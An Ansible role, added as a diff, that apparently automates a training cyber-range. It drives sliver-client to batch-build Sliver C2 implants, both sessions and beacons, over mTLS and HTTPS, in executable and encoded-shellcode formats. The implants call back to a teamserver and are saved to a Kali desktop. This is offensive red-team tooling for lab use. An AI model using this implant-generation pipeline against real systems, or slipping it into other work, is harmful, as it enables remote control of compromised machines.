@@ -1,0 +1,603 @@
+---
+# =============================================================================
+# sliver_payload — drive sliver-client --rc to build a fleet of Sliver
+# implants on Kali and save them to ~/Desktop/payloads/sliver/
+# =============================================================================
+# Runs after the existing `sliver` role has finished building the
+# teamserver + listeners, and after the `kali` role has finished
+# installing sliver-client + importing operator.cfg.
+
+# ---------- Phase 0: skip cleanly on scenarios without Sliver ----------
+- name: Skip — no Sliver teamserver in this range
+  ansible.builtin.debug:
+    msg: >-
+      No Sliver teamserver in this range (groups['sliver'] is empty);
+      skipping payload generation.
+  when: (groups['sliver'] | default([]) | length) == 0
+
+- name: End play for this host when Sliver is absent
+  ansible.builtin.meta: end_host
+  when: (groups['sliver'] | default([]) | length) == 0
+
+# ---------- Phase 1: pick this Kali's Sliver teamserver ----------
+# Mirror the adaptix_payload role's student-id matching pattern.
+- name: Pick teamserver hostname (match by terra_student_id, else first)
+  ansible.builtin.set_fact:
+    sliver_teamserver_name: >-
+      {%- set sid = terra_student_id | default('') -%}
+      {%- set matches = [] -%}
+      {%- for h in groups['sliver'] -%}
+      {%- if (hostvars[h].terra_student_id | default('')) == sid -%}
+      {%- set _ = matches.append(h) -%}
+      {%- endif -%}
+      {%- endfor -%}
+      {{ (matches | first) | default(groups['sliver'] | first, true) }}
+
+- name: Resolve teamserver private IP
+  ansible.builtin.set_fact:
+    sliver_teamserver_host: "{{ hostvars[sliver_teamserver_name].terra_private_ip }}"
+
+# ---------- Phase 2: sanity-check sliver-client + operator.cfg ----------
+- name: Probe sliver-client binary
+  ansible.builtin.stat:
+    path: "{{ sliver_payload_client_path }}"
+  register: sliver_client_stat
+
+- name: Probe operator.cfg
+  ansible.builtin.stat:
+    path: "/home/{{ ansible_user }}/.sliver-client/configs/operator.cfg"
+  register: sliver_opcfg_stat
+
+- name: Fail fast if sliver-client or operator.cfg missing (kali role should have set both up)
+  ansible.builtin.fail:
+    msg: >-
+      {% if not sliver_client_stat.stat.exists %}sliver-client missing
+      at {{ sliver_payload_client_path }}; {% endif %}{% if not
+      sliver_opcfg_stat.stat.exists %}operator.cfg missing at
+      ~/.sliver-client/configs/operator.cfg; {% endif %}re-run the kali
+      role first.
+  when: not sliver_client_stat.stat.exists or not sliver_opcfg_stat.stat.exists
+
+# ---------- Phase 3: ensure base + per-run output dirs + workdir ----------
+# Each invocation builds into a NEW timestamped subdirectory at
+#   ~/Desktop/payloads/sliver/<YYYYMMDDTHHMMSSZ>/
+# with its own nested `_logs/` for stdout/stderr/rc artifacts. A
+# `latest` symlink at the base points at the freshest run.
+- name: Compute UTC build timestamp
+  ansible.builtin.set_fact:
+    sliver_payload_build_timestamp: "{{ lookup('pipe', 'date -u +%Y%m%dT%H%M%SZ') }}"
+
+- name: Compute per-run output + log directories
+  ansible.builtin.set_fact:
+    sliver_payload_run_dir: "{{ sliver_payload_output_dir }}/{{ sliver_payload_build_timestamp }}"
+    sliver_payload_log_dir: "{{ sliver_payload_output_dir }}/{{ sliver_payload_build_timestamp }}/{{ sliver_payload_log_subdir }}"
+
+- name: Ensure base + per-run output + log directories exist
+  ansible.builtin.file:
+    path: "{{ item.path }}"
+    state: directory
+    owner: "{{ ansible_user }}"
+    group: "{{ ansible_user }}"
+    mode: "{{ item.mode }}"
+  loop:
+    - { path: "{{ sliver_payload_output_dir }}", mode: "0755" }
+    - { path: "{{ sliver_payload_run_dir }}",    mode: "0755" }
+    - { path: "{{ sliver_payload_log_dir }}",    mode: "0700" }
+  become: true
+
+- name: Reset workdir (clean slate for this run)
+  ansible.builtin.file:
+    path: "{{ sliver_payload_workdir }}"
+    state: absent
+  become: true
+
+- name: Recreate workdir owned by ansible_user
+  ansible.builtin.file:
+    path: "{{ sliver_payload_workdir }}"
+    state: directory
+    owner: "{{ ansible_user }}"
+    group: "{{ ansible_user }}"
+    mode: "0700"
+  become: true
+
+# ---------- Phase 4: build RC file + drive sliver-client + rename ----------
+# Python wrapper that:
+#   1. Expands the matrix × vias × transports into one `generate` line
+#      per cell, with embedded `echo` markers so we can correlate
+#      sliver-client output to specific cells in the log file.
+#   2. Writes an RC file the sliver-client will replay.
+#   3. (Optional) Runs a pre-flight `version` command first to fail
+#      fast on a broken operator.cfg / unreachable teamserver.
+#   4. Runs sliver-client --rc <file>, capturing FULL stdout + stderr
+#      to a persistent log file in OUT_LOG_DIR.
+#   5. Walks workdir, renames each produced binary into the output dir
+#      with the listener-prefixed filename, atomically.
+#   6. For every cell, classifies success/failure based on the marker
+#      block in the captured log, with the actual sliver-client error
+#      message surfaced in the per-cell [!] line.
+- name: Build all matrix payloads via sliver-client --rc
+  ansible.builtin.shell:
+    cmd: |
+      python3 - <<'PY'
+      import datetime, json, os, shutil, subprocess, sys, tempfile, time, traceback
+      MATRIX       = json.loads(os.environ["SLIVER_MATRIX"])
+      VIAS         = json.loads(os.environ["SLIVER_VIAS"])
+      TRANSPORTS   = json.loads(os.environ["SLIVER_TRANSPORTS"])
+      EXT_MAP      = json.loads(os.environ["SLIVER_EXT_MAP"])
+      TS_HOST      = os.environ["SLIVER_TS_HOST"]
+      CLIENT       = os.environ["SLIVER_CLIENT"]
+      WORKDIR      = os.environ["SLIVER_WORKDIR"]
+      OUT_DIR      = os.environ["SLIVER_OUT_DIR"]
+      OUT_MODE     = int(os.environ["SLIVER_OUT_MODE"], 8)
+      TIMEOUT      = int(os.environ["SLIVER_TIMEOUT"])
+      CELL_TIMEOUT = int(os.environ["SLIVER_CELL_TIMEOUT"])
+      LOG_DIR      = os.environ["SLIVER_LOG_DIR"]
+      PREFLIGHT    = os.environ["SLIVER_PREFLIGHT"] == "true"
+      PREFL_TO     = int(os.environ["SLIVER_PREFLIGHT_TIMEOUT"])
+      CLEANUP      = os.environ["SLIVER_CLEANUP"] == "true"
+      CLEANUP_TO   = int(os.environ["SLIVER_CLEANUP_TIMEOUT"])
+
+      def log(*a):
+          print(*a, flush=True)
+
+      def to_text(s):
+          """Coerce subprocess output (bytes OR str) into a text string.
+          subprocess.TimeoutExpired ignores the parent call's `text=True`
+          — .stdout and .stderr on the exception are ALWAYS bytes. Without
+          this, the TimeoutExpired handler crashed with
+          `TypeError: write() argument must be str, not bytes`,
+          masking the real timeout message with a traceback."""
+          if s is None: return ""
+          if isinstance(s, (bytes, bytearray)):
+              return s.decode("utf-8", errors="replace")
+          return s
+
+      def short(s, n=600):
+          s = to_text(s)
+          return s if len(s) <= n else s[:n] + "...[truncated %d]" % (len(s) - n)
+
+      os.makedirs(WORKDIR, exist_ok=True)
+      os.makedirs(OUT_DIR, exist_ok=True)
+      os.makedirs(LOG_DIR, exist_ok=True)
+
+      # datetime.utcnow() is deprecated in 3.12+; use timezone-aware UTC.
+      timestamp = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%dT%H%M%SZ")
+      stdout_log = os.path.join(LOG_DIR, "sliver-client-%s.stdout.log" % timestamp)
+      stderr_log = os.path.join(LOG_DIR, "sliver-client-%s.stderr.log" % timestamp)
+      rc_log     = os.path.join(LOG_DIR, "build-%s.rc" % timestamp)
+      log("[*] log dir: %s" % LOG_DIR)
+      log("      stdout: %s" % stdout_log)
+      log("      stderr: %s" % stderr_log)
+      log("      rc:     %s" % rc_log)
+
+      # ---- Optional pre-flight: run a trivial `version` command first.
+      # If operator.cfg is broken, the teamserver is unreachable, or
+      # the cert is expired, this will fail in ~5-10s with a clear error
+      # instead of taking the full build budget before discovering it.
+      if PREFLIGHT:
+          pf_rc = os.path.join(WORKDIR, "preflight.rc")
+          with open(pf_rc, "w") as f:
+              f.write("version\nexit\n")
+          log("[*] pre-flight: %s --rc %s (timeout=%ds)" % (CLIENT, pf_rc, PREFL_TO))
+          try:
+              pf = subprocess.run(
+                  [CLIENT, "--rc", pf_rc],
+                  capture_output=True, text=True, timeout=PREFL_TO,
+              )
+          except subprocess.TimeoutExpired as e:
+              sys.exit("sliver-client pre-flight timed out after %ds. "
+                      "operator.cfg likely points at an unreachable teamserver. "
+                      "stdout=%s stderr=%s"
+                      % (PREFL_TO, short(e.stdout, 400), short(e.stderr, 400)))
+          except Exception as e:
+              sys.exit("sliver-client pre-flight raised %s: %s"
+                      % (type(e).__name__, short(str(e), 200)))
+          if pf.returncode != 0:
+              log("[!] pre-flight rc=%d" % pf.returncode)
+              log("[!] pre-flight stdout: %s" % short(pf.stdout, 800))
+              log("[!] pre-flight stderr: %s" % short(pf.stderr, 800))
+              sys.exit("sliver-client pre-flight failed (rc=%d). "
+                      "Aborting before the full build batch." % pf.returncode)
+          log("[+] pre-flight OK")
+          log("      version output: %s" % short(pf.stdout, 400))
+
+      # ---- Plan expansion ----
+      # Each cell gets a unique marker line `### CELL N: <label> ###`
+      # written via `echo` so we can grep the log to find that cell's
+      # output block. The trailing marker `### END CELL N ###` bounds it.
+      plan = []
+      for agent, spec in MATRIX.items():
+          mode    = spec.get("mode", "session")
+          arch    = spec.get("arch", "amd64")
+          builds  = spec.get("builds", []) or []
+          # sliver-client subcommand for this agent mode.
+          gen_cmd = "generate beacon" if mode == "beacon" else "generate"
+          for b in builds:
+              os_kind = b.get("os", "windows")
+              fmt     = b.get("format", "exe")
+              for transport in TRANSPORTS:
+                  for v in VIAS:
+                      via  = v["via"]
+                      port = v["port"]
+                      if transport == "http":
+                          target = "https://%s:%d" % (TS_HOST, port)
+                          flag = "--http"
+                      else:
+                          target = "%s:%d" % (TS_HOST, port)
+                          flag = "--mtls"
+                      ext   = EXT_MAP.get(fmt, "." + fmt)
+                      label = "%s/%s/%s-%s/%s" % (agent, transport, os_kind, fmt, via)
+                      stem  = "%s_HTTPS-%s-%s-%s" % (via, agent, transport, arch)
+                      save_dir = os.path.join(WORKDIR, stem)
+                      os.makedirs(save_dir, exist_ok=True)
+                      final = os.path.join(OUT_DIR, stem + ext)
+                      # sliver-client v1.7+ pops an interactive TUI
+                      # shellcode-encoder picker when --format shellcode
+                      # is requested without --shellcode-encoder. In a
+                      # non-TTY Ansible context the bubbletea form blocks
+                      # on stdin forever, eventually tripping the SLIVER
+                      # _TIMEOUT and reporting 0 builds. Pass the encoder
+                      # explicitly: xor_dynamic for windows shellcode,
+                      # shikata_ga_nai for everything else.
+                      encoder_flag = ""
+                      if fmt == "shellcode":
+                          encoder_flag = (
+                              " --shellcode-encoder xor_dynamic"
+                              if os_kind == "windows"
+                              else " --shellcode-encoder shikata_ga_nai"
+                          )
+                      # --name <stem> gives every generated implant a
+                      # deterministic, predictable name so we can later
+                      # call `implants rm <stem>` to free server-side
+                      # storage. Without --name, sliver-server picks a
+                      # random adjective_noun pair we can't correlate to
+                      # our cell, which makes server-side cleanup
+                      # impossible without parsing `implants` output.
+                      gen_line = (
+                          "%s %s %s --name %s --os %s --arch %s --format %s%s --save %s"
+                          % (gen_cmd, flag, target, stem, os_kind, arch,
+                             fmt, encoder_flag, save_dir)
+                      )
+                      plan.append({
+                          "label":     label,
+                          "gen_line":  gen_line,
+                          "save_dir":  save_dir,
+                          "final":     final,
+                          "stem":      stem,
+                          "agent":     agent,
+                          "via":       via,
+                          "transport": transport,
+                      })
+
+      # ---- Per-cell sliver-client invocations ----
+      # Originally we wrote ALL N `generate` lines into a single RC file
+      # and ran sliver-client ONCE — fast, but one hung compile blocked
+      # all other cells until the global timeout fired. (Observed on a
+      # cold-cache teamserver: cell 0 sat in a `Compiling, please wait`
+      # spinner for 60 min, all 49 other cells never started.)
+      #
+      # Per-cell invocations fix that: each cell gets its own bounded
+      # subprocess.run with CELL_TIMEOUT, so a single hung compile only
+      # costs CELL_TIMEOUT seconds before we move on and surface the
+      # exact label that's broken. The 50× TLS-handshake overhead
+      # (~2s each on localhost-ish RTT) is dwarfed by per-compile cost.
+      def human_bytes(n):
+          """Format byte counts like '1.2 MB' for the summary line."""
+          for unit in ("B", "KB", "MB", "GB"):
+              if n < 1024 or unit == "GB":
+                  return "%.1f %s" % (n, unit) if unit != "B" else "%d B" % n
+              n /= 1024.0
+
+      # Open log files in append mode and write a per-cell delimiter +
+      # the captured output as we go, so a `tail -f` on the host shows
+      # real-time progress.
+      stdout_fh = open(stdout_log, "w", buffering=1)
+      stderr_fh = open(stderr_log, "w", buffering=1)
+      rc_master_fh = open(rc_log, "w")
+
+      def run_cleanup_rm(names, label):
+          """Send `implants rm <name>` for each name; non-fatal on error.
+
+          Used for pre-build sweep + per-cell cleanup. A 'no such implant'
+          response is fine — means it wasn't there to begin with. We just
+          log the rc + tail; we don't propagate failures.
+          """
+          if not names:
+              return
+          rc_path = os.path.join(
+              WORKDIR, "cleanup-%s.rc" % label.replace("/", "_"))
+          with open(rc_path, "w") as f:
+              for n in names:
+                  f.write("implants rm -F %s\n" % n)
+              f.write("exit\n")
+          try:
+              r = subprocess.run(
+                  [CLIENT, "--rc", rc_path],
+                  capture_output=True, text=True, timeout=CLEANUP_TO,
+              )
+              tail = short((r.stdout or "") + (r.stderr or ""), 250)
+              log("      cleanup %s rc=%d %s" % (label, r.returncode, tail))
+          except subprocess.TimeoutExpired:
+              log("      cleanup %s timed out after %ds" % (label, CLEANUP_TO))
+          except Exception as e:
+              log("      cleanup %s exception: %s"
+                  % (label, short(str(e), 200)))
+
+      # ---- Pre-build cleanup: wipe any leftover same-named implants ----
+      # Re-runs of the same matrix would otherwise collide on `--name`,
+      # forcing sliver-server to either refuse the build or auto-rename.
+      # Removing first guarantees a clean slate AND frees the disk that
+      # the previous run consumed.
+      if CLEANUP:
+          stem_names = [entry["stem"] for entry in plan]
+          log("[*] pre-build cleanup: removing %d leftover server-side"
+              " implants (terra-range stems) from previous runs"
+              % len(stem_names))
+          run_cleanup_rm(stem_names, "pre-build")
+
+      built, failed = [], []
+      per_agent_built     = {}
+      per_via_built       = {}
+      per_transport_built = {}
+      total_bytes         = 0
+      batch_deadline = time.time() + TIMEOUT
+      for i, entry in enumerate(plan):
+          label = entry["label"]
+          if time.time() >= batch_deadline:
+              # Total-budget exhausted; skip remaining cells without
+              # invoking sliver-client. This bounds the worst-case
+              # behavior of a wedged builder — even if every cell hits
+              # CELL_TIMEOUT, we never exceed TIMEOUT in total wall.
+              skip_reason = ("total batch timeout %ds reached at cell %d/%d"
+                             % (TIMEOUT, i + 1, len(plan)))
+              failed.append("%s: %s" % (label, skip_reason))
+              log("[!] %s: %s" % (label, skip_reason))
+              continue
+
+          # Per-cell RC file: one `generate` line + `exit`.
+          cell_rc = os.path.join(WORKDIR, "cell-%03d.rc" % i)
+          with open(cell_rc, "w") as f:
+              f.write(entry["gen_line"] + "\n")
+              f.write("exit\n")
+          # Append to the master RC log for post-mortem (single file
+          # containing all 50 commands in order).
+          rc_master_fh.write("### CELL %03d %s ###\n" % (i, label))
+          rc_master_fh.write(entry["gen_line"] + "\n")
+
+          log("[*] cell %d/%d %s (timeout=%ds)"
+              % (i + 1, len(plan), label, CELL_TIMEOUT))
+          stdout_fh.write("\n### CELL %03d %s ###\n" % (i, label))
+          stderr_fh.write("\n### CELL %03d %s ###\n" % (i, label))
+
+          t_start = time.time()
+          try:
+              r = subprocess.run(
+                  [CLIENT, "--rc", cell_rc],
+                  capture_output=True, text=True, timeout=CELL_TIMEOUT,
+              )
+              cell_out = r.stdout or ""
+              cell_err = r.stderr or ""
+              rc = r.returncode
+              timed_out = False
+          except subprocess.TimeoutExpired as e:
+              cell_out = to_text(e.stdout)
+              cell_err = to_text(e.stderr)
+              rc = -1
+              timed_out = True
+          except Exception as e:
+              cell_out = ""
+              cell_err = "%s: %s" % (type(e).__name__, str(e))
+              rc = -2
+              timed_out = False
+          elapsed = time.time() - t_start
+          stdout_fh.write(cell_out)
+          stderr_fh.write(cell_err)
+
+          if timed_out:
+              msg = ("sliver-client per-cell timeout %ds reached"
+                     " (server build likely wedged on this cell)"
+                     % CELL_TIMEOUT)
+              failed.append("%s: %s | stdout-tail: %s"
+                            % (label, msg, short(cell_out[-300:], 300)))
+              log("[!] %s: %s (%.1fs elapsed)" % (label, msg, elapsed))
+              continue
+          if rc != 0:
+              tail = short((cell_err or cell_out)[-400:], 400)
+              failed.append("%s: rc=%d | %s" % (label, rc, tail))
+              log("[!] %s: rc=%d (%.1fs elapsed) | %s"
+                  % (label, rc, elapsed, tail))
+              continue
+
+          # ---- Walk save_dir, rename ----
+          files = []
+          if os.path.isdir(entry["save_dir"]):
+              files = sorted(
+                  (os.path.join(entry["save_dir"], f)
+                   for f in os.listdir(entry["save_dir"])),
+                  key=lambda p: os.path.getsize(p), reverse=True,
+              )
+          if not files:
+              tail = short(cell_out[-400:], 400)
+              failed.append("%s: no output in %s (rc=0) | tail: %s"
+                            % (label, entry["save_dir"], tail))
+              log("[!] %s: no output in %s after %.1fs"
+                  % (label, entry["save_dir"], elapsed))
+              continue
+          src = files[0]
+          try:
+              fd, tmpname = tempfile.mkstemp(
+                  prefix=".sliver-", suffix=".tmp",
+                  dir=os.path.dirname(entry["final"]),
+              )
+              os.close(fd)
+              shutil.copyfile(src, tmpname)
+              os.chmod(tmpname, OUT_MODE)
+              os.replace(tmpname, entry["final"])
+              built.append(entry["final"])
+              sz = os.path.getsize(entry["final"])
+              total_bytes += sz
+              per_agent_built[entry["agent"]] = (
+                  per_agent_built.get(entry["agent"], 0) + 1)
+              per_via_built[entry["via"]] = (
+                  per_via_built.get(entry["via"], 0) + 1)
+              per_transport_built[entry["transport"]] = (
+                  per_transport_built.get(entry["transport"], 0) + 1)
+              log("[+] %s -> %s (%s in %.1fs)"
+                  % (label, os.path.basename(entry["final"]),
+                     human_bytes(sz), elapsed))
+              # Server-side cleanup immediately after a successful
+              # local-copy. Keeps teamserver disk usage bounded across
+              # the batch instead of accumulating ~30 MB × N implants.
+              if CLEANUP:
+                  run_cleanup_rm([entry["stem"]], "cell-%03d" % i)
+          except Exception as e:
+              tb = traceback.format_exc()
+              failed.append("%s: %s: %s"
+                            % (label, type(e).__name__, short(str(e), 200)))
+              log("[!] %s: %s: %s"
+                  % (label, type(e).__name__, short(str(e), 200)))
+              log("      traceback: %s" % short(tb, 600))
+              try: os.unlink(tmpname)
+              except Exception: pass
+
+      stdout_fh.close()
+      stderr_fh.close()
+      rc_master_fh.write("exit\n")
+      rc_master_fh.close()
+
+      log("")
+      log("---- summary ----")
+      log("[+] %d built, %d failed (of %d planned)"
+          % (len(built), len(failed), len(plan)))
+      log("[+] total size on disk : %s across %d file(s)"
+          % (human_bytes(total_bytes), len(built)))
+      log("[+] per-agent breakdown:")
+      for agent in MATRIX.keys():
+          log("      %-12s %3d built" % (agent, per_agent_built.get(agent, 0)))
+      log("[+] per-transport breakdown:")
+      for t in TRANSPORTS:
+          log("      %-12s %3d built" % (t, per_transport_built.get(t, 0)))
+      log("[+] per-via breakdown:")
+      for v in VIAS:
+          via = v["via"]
+          log("      %-12s %3d built" % (via, per_via_built.get(via, 0)))
+      if built:
+          log("[+] built files (sorted by name):")
+          for outpath in sorted(built):
+              try:    sz = os.path.getsize(outpath)
+              except OSError: sz = 0
+              log("      %-50s %s"
+                  % (os.path.basename(outpath), human_bytes(sz)))
+      log("[+] full sliver-client output preserved at:")
+      log("      %s" % stdout_log)
+      log("      %s" % stderr_log)
+      log("      %s" % rc_log)
+      if failed:
+          log("---- failed builds ----")
+          for f in failed:
+              log("  - " + f)
+      if not built:
+          sys.exit("0 Sliver payloads built — see [!] / failed list above. "
+                   "Full sliver-client output: %s" % stdout_log)
+      PY
+    executable: /bin/bash
+  environment:
+    SLIVER_MATRIX:              "{{ sliver_payload_matrix | to_json }}"
+    SLIVER_VIAS:                "{{ sliver_payload_listener_vias | to_json }}"
+    SLIVER_TRANSPORTS:          "{{ sliver_payload_transports | to_json }}"
+    SLIVER_EXT_MAP:             "{{ sliver_payload_ext_for_format | to_json }}"
+    SLIVER_TS_HOST:             "{{ sliver_teamserver_host }}"
+    SLIVER_CLIENT:              "{{ sliver_payload_client_path }}"
+    SLIVER_WORKDIR:             "{{ sliver_payload_workdir }}"
+    SLIVER_OUT_DIR:             "{{ sliver_payload_run_dir }}"
+    SLIVER_OUT_MODE:            "{{ sliver_payload_output_mode }}"
+    SLIVER_TIMEOUT:             "{{ sliver_payload_client_timeout_seconds }}"
+    SLIVER_CELL_TIMEOUT:        "{{ sliver_payload_per_cell_timeout_seconds }}"
+    SLIVER_LOG_DIR:             "{{ sliver_payload_log_dir }}"
+    SLIVER_PREFLIGHT:           "{{ sliver_payload_preflight_enabled | string | lower }}"
+    SLIVER_PREFLIGHT_TIMEOUT:   "{{ sliver_payload_preflight_timeout_seconds }}"
+    SLIVER_CLEANUP:             "{{ sliver_payload_cleanup_server_implants | string | lower }}"
+    SLIVER_CLEANUP_TIMEOUT:     "{{ sliver_payload_cleanup_timeout_seconds }}"
+  become: true
+  become_user: "{{ ansible_user }}"
+  register: sliver_build
+  changed_when: "'built,' in (sliver_build.stdout | default(''))"
+
+# ---------- Phase 5: cleanup workdir + symlink + summary ----------
+# Keep the per-run dir (which contains its own _logs/) so the operator
+# can post-mortem. Wipe the transient workdir.
+- name: Remove workdir
+  ansible.builtin.file:
+    path: "{{ sliver_payload_workdir }}"
+    state: absent
+  become: true
+
+- name: Update `latest` symlink to point at this run
+  ansible.builtin.file:
+    src: "{{ sliver_payload_build_timestamp }}"
+    dest: "{{ sliver_payload_output_dir }}/latest"
+    state: link
+    force: true
+    owner: "{{ ansible_user }}"
+    group: "{{ ansible_user }}"
+  become: true
+
+# ---------- Phase 6: retention sweep (keep latest N run dirs) ----------
+# Each run is a self-contained timestamped subdir (~1.5 GB on a full matrix).
+# Prune older ones so disk usage stays bounded. Runs in REVERSE-sorted order
+# of the timestamped subdir name; the just-completed run is always the
+# newest, so the current run is never the prune target.
+#
+# `find` with file_type=directory and recurse=false lists only the
+# immediate subdirs of the base output dir. The `latest` symlink (which
+# is a symlink, not a directory) is excluded automatically by file_type,
+# but we also reject by name as a belt-and-suspenders defense in case a
+# future ansible find module follows symlinks differently.
+- name: Retention sweep — list existing run directories
+  ansible.builtin.find:
+    paths: "{{ sliver_payload_output_dir }}"
+    file_type: directory
+    recurse: false
+  register: sliver_payload_existing_runs
+
+- name: Retention sweep — compute prune list (keep latest {{ sliver_payload_retention_runs }})
+  ansible.builtin.set_fact:
+    # Lexicographic sort over YYYYMMDDTHHMMSSZ stems is identical to
+    # chronological sort. `[:-N]` is "everything except the last N";
+    # combined with ascending sort that's "everything older than the
+    # newest N" — exactly the prune set.
+    sliver_payload_runs_to_prune: >-
+      {{ (sliver_payload_existing_runs.files
+          | map(attribute='path')
+          | reject('search', '/latest$')
+          | sort
+          | list)[:-(sliver_payload_retention_runs | int)] }}
+
+- name: Retention sweep — report plan
+  ansible.builtin.debug:
+    msg: "{{
+      [
+        '---- sliver_payload retention ----',
+        'keep latest : ' ~ (sliver_payload_retention_runs | string) ~ ' run(s)',
+        'total runs  : ' ~ (sliver_payload_existing_runs.files | length | string),
+        'to prune    : ' ~ (sliver_payload_runs_to_prune | length | string),
+      ] + (sliver_payload_runs_to_prune | map('basename') | list)
+    }}"
+
+- name: Retention sweep — prune old run directories
+  ansible.builtin.file:
+    path: "{{ item }}"
+    state: absent
+  loop: "{{ sliver_payload_runs_to_prune }}"
+  loop_control:
+    label: "{{ item | basename }}"
+  become: true
+
+- name: Report build summary
+  ansible.builtin.debug:
+    msg: "{{ [
+      '---- sliver_payload build summary ----',
+      'run dir : ' + sliver_payload_run_dir,
+      'log dir : ' + sliver_payload_log_dir,
+      'latest  : ' + sliver_payload_output_dir + '/latest -> ' + sliver_payload_build_timestamp,
+    ] + (sliver_build.stdout_lines | default([])) }}"
